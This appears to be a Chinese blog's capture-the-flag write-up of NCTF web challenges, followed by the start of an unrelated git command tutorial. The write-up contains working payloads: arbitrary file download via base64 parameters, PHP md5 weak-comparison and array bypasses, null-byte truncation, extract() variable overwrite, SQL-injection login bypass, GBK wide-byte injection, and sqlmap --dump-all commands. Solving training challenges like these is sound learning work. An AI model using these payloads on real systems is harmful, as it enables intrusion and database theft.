<p>Tips说不要下载mp3文件，先看下源码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"templatemo_content"</span>&gt;</span></div><div class="line"></div><div class="line">           <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content_title_01"</span>&gt;</span>听会歌吧<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"horizontal_divider_01"</span>&gt;</span>&amp;nbsp;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cleaner"</span>&gt;</span>&amp;nbsp;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span>为了让大家更轻松的比赛，为大家准备了两首歌让大家下载<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"></div><div class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"download.php?url=eGluZ3hpbmdkaWFuZGVuZy5tcDM="</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>星星点灯<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">           <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"download.php?url=YnV4aWFuZ3poYW5nZGEubXAz"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>不想长大<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"></div><div class="line"></div><div class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cleaner"</span>&gt;</span>&amp;nbsp;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">       <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>发现下载链接格式均为：<br><figure class="highlight fix"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">download.php?url</span>=<span class="string">base64</span></div></pre></td></tr></table></figure></p>
<p>其中base64为文件名。还有一个提示是”down”，查询”down.php”的base64编码后构造：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span>way.nuptzj.cn<span class="regexp">/web6/</span>download.php?url=ZG93bi5waHA=</div></pre></td></tr></table></figure></p>
<p>没有得到什么东西。再尝试”download.php”：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span>way.nuptzj.cn<span class="regexp">/web6/</span>download.php?url=ZG93bmxvYWQucGhw</div></pre></td></tr></table></figure></p>
<p>拿到一份php源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">??<span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">include</span>(<span class="string">"hereiskey.php"</span>);</div><div class="line">$url=base64_decode($_GET[url]);</div><div class="line"><span class="keyword">if</span>( $url==<span class="string">"hereiskey.php"</span> || $url==<span class="string">"buxiangzhangda.mp3"</span> || $url==<span class="string">"xingxingdiandeng.mp3"</span> || $url==<span class="string">"download.php"</span>)&#123;</div><div class="line">	$file_size = filesize($url);</div><div class="line">	header ( <span class="string">"Pragma: public"</span> );</div><div class="line">	header ( <span class="string">"Cache-Control: must-revalidate, post-check=0, pre-check=0"</span> );</div><div class="line">	header ( <span class="string">"Cache-Control: private"</span>, <span class="keyword">false</span> );</div><div class="line">	header ( <span class="string">"Content-Transfer-Encoding: binary"</span> );</div><div class="line">	header ( <span class="string">"Content-Type:audio/mpeg MP3"</span>);</div><div class="line">	header ( <span class="string">"Content-Length: "</span> . $file_size);</div><div class="line">	header ( <span class="string">"Content-Disposition: attachment; filename="</span>.$url);</div><div class="line">	<span class="keyword">echo</span>(file_get_contents($url));</div><div class="line">	<span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"Access Forbidden!"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>发现还有一个文件hereiskey.php，构造新的payload:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span>way.nuptzj.cn<span class="regexp">/web6/</span>download.php?url=aGVyZWlza2V5LnBocA==</div></pre></td></tr></table></figure></p>
<p>下载之：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">?<span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//flag:nctf&#123;download_any_file_666&#125;</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>URL: <a href="http://chinalover.sinaapp.com/web19/" target="_blank" rel="external">http://chinalover.sinaapp.com/web19/</a></p>
<blockquote>
<p>参考文档： <a href="https://stackoverflow.com/questions/22140204/why-md5240610708-is-equal-to-md5qnkcdzo" target="_blank" rel="external">https://stackoverflow.com/questions/22140204/why-md5240610708-is-equal-to-md5qnkcdzo</a></p>
</blockquote>
<p><br></p>
<p>给出了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);</div><div class="line">$a = @$_GET[<span class="string">'a'</span>];</div><div class="line">$md52 = @md5($a);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</div><div class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"nctf&#123;*****************&#125;"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"false!!!"</span>;</div><div class="line">&#125;&#125;</div><div class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>php的弱类型问题。a不能等于QNKCDZO但是a的md5值要等于QNKCDZO加密后的md5值。文档里给出的解释是：  </p>
<blockquote>
<p>   md5(‘240610708’) ‘s result is  0e462097431906509019562988736854.<br>   md5(‘QNKCDZO’) ‘s result is 0e830400451993494058024219903391.    <br><br>  </p>
<p>   They are both float number format strings (numerical strings), and if you use == in php, when compare a number with a string or the comparison involves numerical strings, then each string is converted to a number and the comparison performed numerically.   <br><br></p>
<p>   Both of the strings are converted to 0 when compared with ==, if you want to compare them as string, remember to use ===(strict comparison) instead.</p>
</blockquote>
<p><br></p>
<p>payload：<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//chinalover.sinaapp.com/web19/?a=240610708</span></div></pre></td></tr></table></figure></p>
<h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p>URL: <a href="http://chinalover.sinaapp.com/web11/" target="_blank" rel="external">http://chinalover.sinaapp.com/web11/</a></p>
<p>按提示看了波robots.txt，构造：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span>chinalover.sinaapp.com<span class="regexp">/web11/</span>robots.txt</div></pre></td></tr></table></figure></p>
<p>得到TIP与源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">TIP:sql.php</div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_GET[id]) &#123;</div><div class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</div><div class="line">  mysql_select_db(SAE_MYSQL_DB);</div><div class="line">  $id = intval($_GET[id]);</div><div class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select content from ctf2 where id='$id'"</span>));</div><div class="line">  <span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span>($query[content]);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>可以得出flag在sql.php下，需要传入id值，注意到intval函数，这里做了个int型的强转换。<br>payload：  </p>
<pre><code>http://chinalover.sinaapp.com/web11/sql.php?id=1024.1
</code></pre><h2 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h2><p>URL: <a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php" target="_blank" rel="external">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php</a>   </p>
<p>view-source:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</div><div class="line">        <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</div><div class="line">            <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </div><div class="line">            <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>这里学了一个00截断。首先要满足传入的值是数字，然后又要传入#biubiubiu，用字符截断构造payload：<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">http</span>://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=1<span class="number">%00</span><span class="number">%23</span>biubiubiu</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">Flag:</span> <span class="string">flag:</span>nctf&#123;use_00_to_jieduan&#125;</div></pre></td></tr></table></figure></p>
<h2 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h2><p>URL: <a href="http://chinalover.sinaapp.com/web17/index.php" target="_blank" rel="external">http://chinalover.sinaapp.com/web17/index.php</a>   </p>
<p>源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>])) &#123;</div><div class="line"><span class="keyword">if</span> ($_GET[<span class="string">'a'</span>] != $_GET[<span class="string">'b'</span>])</div><div class="line"><span class="keyword">if</span> (md5($_GET[<span class="string">'a'</span>]) === md5($_GET[<span class="string">'b'</span>]))</div><div class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="keyword">print</span> <span class="string">'Wrong.'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>之前有做过类似的，payload如下:<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="link">http://chinalover.sinaapp.com/web17/index.php?a</span>[<span class="string"></span>]=1&amp;b[]=2</div></pre></td></tr></table></figure></p>
<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>URL: <a href="http://chinalover.sinaapp.com/web18/index.php" target="_blank" rel="external">http://chinalover.sinaapp.com/web18/index.php</a>   </p>
<p>先看一波source:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php if ($_SERVER["REQUEST_METHOD"] == "POST") &#123; ?&gt;</div><div class="line">                        &lt;?php</div><div class="line">                        extract($_POST);</div><div class="line">                        if ($pass == $thepassword_123) &#123; ?&gt;</div><div class="line">                            &lt;div class="alert alert-success"&gt;</div><div class="line">                                &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;</div><div class="line">                            &lt;/div&gt;</div><div class="line">                        &lt;?php &#125; ?&gt;</div><div class="line">                    &lt;?php &#125; ?&gt;</div></pre></td></tr></table></figure></p>
<p>题目很明显了的变量覆盖，上hackbar发个post就可以了：<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">pass</span>=<span class="number">1</span>&amp;thepassword_123=<span class="number">1</span></div></pre></td></tr></table></figure></p>
<p><br></p>
<ul>
<li>这里有个extract函数，可以看看这个：<a href="http://www.w3school.com.cn/php/func_array_extract.asp" target="_blank" rel="external">http://www.w3school.com.cn/php/func_array_extract.asp</a></li>
</ul>
<h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p>URL: <a href="http://chinalover.sinaapp.com/index.php" target="_blank" rel="external">http://chinalover.sinaapp.com/index.php</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</div><div class="line">    mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</div><div class="line">  mysql_select_db(SAE_MYSQL_DB);</div><div class="line">  $user = trim($_POST[user]);</div><div class="line">  $pass = md5(trim($_POST[pass]));</div><div class="line">  $sql=<span class="string">"select user from ctf where (user='"</span>.$user.<span class="string">"') and (pw='"</span>.$pass.<span class="string">"')"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>.$sql;</div><div class="line">  $query = mysql_fetch_array(mysql_query($sql));</div><div class="line">  <span class="keyword">if</span>($query[user]==<span class="string">"admin"</span>) &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span>($query[user] != <span class="string">"admin"</span>) &#123;</div><div class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> $query[user];</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>抓住这句：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql="<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> ctf <span class="keyword">where</span> (<span class="keyword">user</span>=<span class="string">'".$user."'</span>) <span class="keyword">and</span> (pw=<span class="string">'".$pass."'</span>)<span class="string">";</span></div></pre></td></tr></table></figure></p>
<p>尝试user=admin’)提前闭合的方法，只能看到一条warning<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Warning: mysql_fetch_array() expects parameter <span class="number">1</span> <span class="keyword">to</span> be resource, <span class="built_in">boolean</span> <span class="keyword">given</span> <span class="keyword">in</span> index.php <span class="keyword">on</span> line <span class="number">14</span></div></pre></td></tr></table></figure></p>
<p>于是构造新的payload把后面的语句注释掉<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">admin') <span class="comment">--abc</span></div></pre></td></tr></table></figure></p>
<p>提交拿到flag<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Logged <span class="keyword">in</span>! <span class="string">flag:</span>nctf&#123;ni_ye_hui_sql?&#125;</div></pre></td></tr></table></figure></p>
<h2 id="sql-injection-3"><a href="#sql-injection-3" class="headerlink" title="sql injection 3"></a>sql injection 3</h2><p>URL: <a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="external">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a>    </p>
<p>先试了下id=1’，得到的回显是：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">your sql:<span class="keyword">select</span> <span class="keyword">id</span>,title <span class="keyword">from</span> news <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1\''</span></div><div class="line">Hello World!OVO</div></pre></td></tr></table></figure></p>
<p>单引号被转义了。再访问id=2，得到语句：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">your sql:<span class="keyword">select</span> <span class="keyword">id</span>,title <span class="keyword">from</span> news <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'2'</span></div><div class="line">gbk_sql_injection</div></pre></td></tr></table></figure></p>
<p>可以确定是个宽字节注入的问题。我们可以利用%df’来逃脱单引号束缚，以进行下一步的注入。</p>
<blockquote>
<p>%df%5c在GBK编码中是属于一个字符”運”，我我们输入id=1%df%27的时候，程序检测到有单引号（%27），就默认在它前面加了一个转义符（%5c），数据库查询语句就变成了<strong>select * from news where id = ‘1%df%5c%27’</strong>，又因为%df%5c在GBK编码中是一个中文字符，这样我们的%27（也就是单引号）就逃出转义了。</p>
</blockquote>
<p>构造id=%df’，果然看到报错了：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">your sql:<span class="keyword">select</span> <span class="keyword">id</span>,title <span class="keyword">from</span> news <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'ß\''</span></div><div class="line"><span class="keyword">Warning</span>: mysql_fetch_array() expects parameter <span class="number">1</span> <span class="keyword">to</span> be <span class="keyword">resource</span>, <span class="built_in">boolean</span> given <span class="keyword">in</span> <span class="keyword">SQL</span>-GBK/index.php <span class="keyword">on</span> line <span class="number">10</span></div></pre></td></tr></table></figure></p>
<p>下面开始注入，试了两种方法，分手动注入与使用sqlmap两种方式来讲讲。</p>
<h3 id="手动注入的方式"><a href="#手动注入的方式" class="headerlink" title="手动注入的方式"></a>手动注入的方式</h3><p><del>注意这里的<strong>union</strong>必须前后字段数相同。</del><br><del>//查看当前数据库有几列：?id=1%df’ order by 3 –+</del>   </p>
<p><del>your sql:select id,title from news where id = ‘1ß\’ order by 3 – ‘</del><br><del>Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in SQL-GBK/index.php on line 10</del>    </p>
<p><del>//？id=1%df%27 union select 1, table_name from information_schema.tables%23</del>  </p>
<p><del>your sql:select id,title from news where id = ‘ß\’ union select 1, table_name from information_schema.tables#’</del><br><del>CHARACTER_SETS</del>   </p>
<p>假的，后来再看好像改了题目，之后再补充吧。</p>
<h3 id="使用sqlmap的方式"><a href="#使用sqlmap的方式" class="headerlink" title="使用sqlmap的方式"></a>使用sqlmap的方式</h3><p>前面我们已经确定了注入点，于是试了试用sqlmap来爆出flag，也算是熟悉一下这个工具。</p>
<blockquote>
<p>sqlmap支持五种不同的注入模式：   </p>
<ol>
<li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入。   </li>
<li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。    </li>
<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。    </li>
<li>联合查询注入，可以使用union的情况下的注入。    </li>
<li>堆查询注入，可以同时执行多条语句的执行时的注入。      </li>
</ol>
</blockquote>
<p>先列举下数据库表：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'"</span> --tables</div></pre></td></tr></table></figure></p>
<p><img src="/2017/06/01/NCTF/SQLi3-tables.png" alt="">     </p>
<p>发现可以爆表，得到了如下五个表名(另外information_schema这张表里保存了MySQL服务器所有数据库信息，比如数据库名，数据库的表，表格里的数据类型与访问权限等。)：</p>
<p><img src="/2017/06/01/NCTF/SQLi3-tables-2.png" alt=""></p>
<p>列举表中字段：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'"</span> --<span class="attribute">columns</span> -T ctf</div></pre></td></tr></table></figure></p>
<p><img src="/2017/06/01/NCTF/SQLi3-columns-ctf.png" alt=""></p>
<p>没找到什么有用的东西。直接跑出所有表中的内容：<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap.py -u <span class="string">"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'"</span> --<span class="keyword">dump</span>-all</div></pre></td></tr></table></figure></p>
<p>在ctf4这张表里找到了flag。(在ctf2的表里还有个假flag…)    </p>
<p><img src="/2017/06/01/NCTF/SQLi3-ctf4.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[GIT时光机]]></title>
      <url>/2017/05/13/git/</url>
      <content type="html"><![CDATA[<p>Ak师傅的小灶上谈了些关于git的常见用法，回去以后做了些整理。</p>
<a id="more"></a>
<p>参考链接：</p>
<blockquote>
<p><a href="https://wiki.vidar.club/doku.php?id=wiki:git%E6%97%B6%E5%85%89%E6%9C%BA" target="_blank" rel="external">Aklis写的wiki</a><br><a href="http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html" target="_blank" rel="external">阮一峰的git教程</a><br><a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="external">廖雪峰的git教程</a></p>
</blockquote>
<hr>
<h1 id="一、时光机硬件说明书"><a href="#一、时光机硬件说明书" class="headerlink" title="一、时光机硬件说明书"></a>一、时光机硬件说明书</h1><ul>
<li><strong>Workspace：</strong> 工作区</li>
<li><strong>Index / Stage：</strong> 暂存区</li>
<li><strong>Repository：</strong> 本地仓库</li>
<li><strong>Remote：</strong> 远程仓库</li>
<li><strong>HEAD：</strong> 当前分支</li>
<li><strong>Commit history：</strong> 历史记录</li>
</ul>
<h2 id="0X01-零件组装"><a href="#0X01-零件组装" class="headerlink" title="0X01 零件组装"></a>0X01 零件组装</h2><p>这里有三种情况：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1. 在当前目录新建一个Git代码库(如果是要使用github上的库，需要先pull下来，不然无法</div><div class="line">push到目标库，这里的第三种方法就可以。)</div><div class="line"><span class="meta">$</span><span class="bash"> git init</span></div><div class="line"></div><div class="line">2. 新建目录，将其初始化为Git仓库</div><div class="line"><span class="meta">$</span><span class="bash"> git init project-name</span></div><div class="line"></div><div class="line">3. pull下来一个项目与其代码历史</div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> URL</span></div></pre></td></tr></table></figure></p>
<h2 id="0X02-时光机的配置"><a href="#0X02-时光机的配置" class="headerlink" title="0X02 时光机的配置"></a>0X02 时光机的配置</h2><p>Git有个设置文件<strong>.gitconfig</strong>，它可以全局配置，也可以项目配置。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1.显示当前的Git配置</div><div class="line"><span class="meta">$</span><span class="bash"> git config --list</span></div><div class="line"></div><div class="line">2.编辑Git配置文件</div><div class="line"><span class="meta">$</span><span class="bash"> git config <span class="_">-e</span> [--global]</span></div><div class="line"></div><div class="line">3.设置提交代码时的用户信息</div><div class="line"><span class="meta">$</span><span class="bash"> git config [--global] user.name <span class="string">"name"</span></span></div><div class="line"><span class="meta">$</span><span class="bash"> git config [--global] user.email <span class="string">"email address"</span></span></div></pre></td></tr></table></figure></p>
<h2 id="0X03-在时光机上注入add钙奶"><a href="#0X03-在时光机上注入add钙奶" class="headerlink" title="0X03 在时光机上注入add钙奶"></a>0X03 在时光机上注入add钙奶</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">1.添加指定文件到暂存区</div><div class="line"><span class="meta">$</span><span class="bash"> git add file1 file2 ...    </span></div><div class="line"></div><div class="line">2.添加指定目录到暂存区（包括其中的子目录）</div><div class="line"><span class="meta">$</span><span class="bash"> git add dir（文件夹名称）</span></div><div class="line"></div><div class="line">3.添加当前目录所有文件到暂存区</div><div class="line"><span class="meta">$</span><span class="bash"> git add .</span></div><div class="line"></div><div class="line">4.分次提交</div><div class="line"><span class="meta">$</span><span class="bash"> git add -p</span></div><div class="line"></div><div class="line">5.删除工作区文件，并且把这次删除放入暂存区</div><div class="line"><span class="meta">$</span><span class="bash"> git rm file1 file2 ...</span></div><div class="line"></div><div class="line">6.停止追踪指定文件（该文件会保留在工作区）</div><div class="line"><span class="meta">$</span><span class="bash"> git rm --cached file</span></div><div class="line"></div><div class="line">7.改名文件，然后把这个改名文件放入暂存区</div><div class="line"><span class="meta">$</span><span class="bash"> git mv file-original file-renamed</span></div></pre></td></tr></table></figure>
